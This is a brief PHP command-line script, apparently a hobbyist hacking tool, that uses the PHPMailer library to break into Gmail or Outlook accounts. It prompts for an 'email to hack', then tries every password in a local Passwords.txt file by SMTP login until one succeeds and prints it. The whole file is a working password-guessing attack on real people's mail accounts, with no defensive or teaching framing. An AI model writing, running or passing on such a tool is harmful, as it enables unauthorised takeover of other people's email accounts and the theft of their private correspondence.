<?php

require './PHPMailer-master/PHPMailerAutoload.php';
$mail= new PHPMailer;
$handle = fopen("php://stdin","r");
echo "\n1. Gmail\n2. Outlook\n";
echo "Select : ";
$line=trim(fgets($handle));
$mail->isSMTP();
$mail->SMTPAuth=true;
$mail->SMTPSecure='tls';
$mail->Port=587;
if($line==1)
    $mail->Host='smtp.gmail.com';
else
if($line==2)
    $mail->Host='smtp.live.com';
else
{
    echo "Sorry, wrong choice\n";
    exit;
}
echo "Enter email to hack:\n";
$user=trim(fgets($handle));
$fh=fopen("Passwords.txt","r");
while(!feof($fh))
{
    $pass=trim(fgets($fh));
    $mail->Username=$user;
    $mail->Password=$pass;
    if($mail->smtpConnect())
    {
        echo "Password Found!\n".$pass;
        exit;
    }
    else
    {
        echo "Failed with Password: ".$pass."\n";
    }
}
?>